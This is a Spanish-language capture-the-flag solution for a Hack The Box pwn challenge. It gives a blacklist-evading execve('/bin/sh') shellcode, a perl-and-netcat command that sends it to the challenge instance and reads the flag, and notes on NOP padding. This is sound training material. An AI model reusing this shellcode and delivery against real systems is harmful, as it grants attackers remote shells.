# Resolver "Execute" a mano (perl + nc, sin pwntools)

Es la forma recomendada para la revisión presencial: un solo comando.

## Shellcode de una etapa (44 bytes, sin bytes de la lista negra)

Construye execve("/bin/sh") esquivando los 16 bytes prohibidos. El string
"/bin//sh" se guarda cifrado con XOR 0x0d y se descifra en tiempo de ejecución;
el número de syscall 59 (0x3b, prohibido) se arma con 0x40-5.

String perl (\x..):

    \x48\xbb\x22\x6f\x64\x63\x22\x22\x7e\x65\x48\xb9\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x48\x31\xcb\x6a\x00\x53\x48\x89\xe7\x6a\x00\x58\xb0\x40\x2c\x05\x6a\x00\x5e\x6a\x00\x5a\x0f\x05

## Comando contra la instancia de HTB

    ( perl -e 'print "\x48\xbb\x22\x6f\x64\x63\x22\x22\x7e\x65\x48\xb9\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x48\x31\xcb\x6a\x00\x53\x48\x89\xe7\x6a\x00\x58\xb0\x40\x2c\x05\x6a\x00\x5e\x6a\x00\x5a\x0f\x05"' ; sleep 0.5 ; echo 'cat flag.txt' ; cat ) | nc 154.57.164.74 31977

(Cambia IP y puerto por los de tu instancia.)

## Por qué cada parte

- perl -e 'print "..."'  -> escribe los bytes crudos del shellcode en stdout.
- sleep 0.5              -> ESENCIAL. Deja que el programa haga su read() y
                           ejecute el shellcode ANTES de que lleguen los comandos.
                           Si no, el read(buf,60) se traga el shellcode + "cat
                           flag.txt" juntos, y "flag" tiene letras prohibidas
                           (f,l,a,g) -> lo rechaza el check().
- echo 'cat flag.txt'    -> ya dentro de la shell, lee la bandera.
- cat                    -> mantiene stdin abierto para que la shell siga viva y
                           puedas escribir mas comandos (ls, id, exit).

## Variante: shellcode en un .txt

Guarda los bytes crudos en un archivo y mandalos con cat:

    # crear el archivo una vez:
    perl -e 'print "\x48\xbb...\x0f\x05"' > sc.bin
    # usarlo:
    ( cat sc.bin ; sleep 0.5 ; echo 'cat flag.txt' ; cat ) | nc IP PUERTO

## Sobre el operador "x" de perl (multiplicar un byte)

    perl -e 'print "\x90" x 20'   # imprime 20 bytes 0x90 (NOP)

Sirve para rellenos / NOP sleds cuando hay que alinear o rellenar un buffer.
En ESTE reto no hace falta: el programa salta directo al inicio de tu entrada,
asi que no hay que rellenar nada. Pero es util tenerlo para otros retos de pwn.
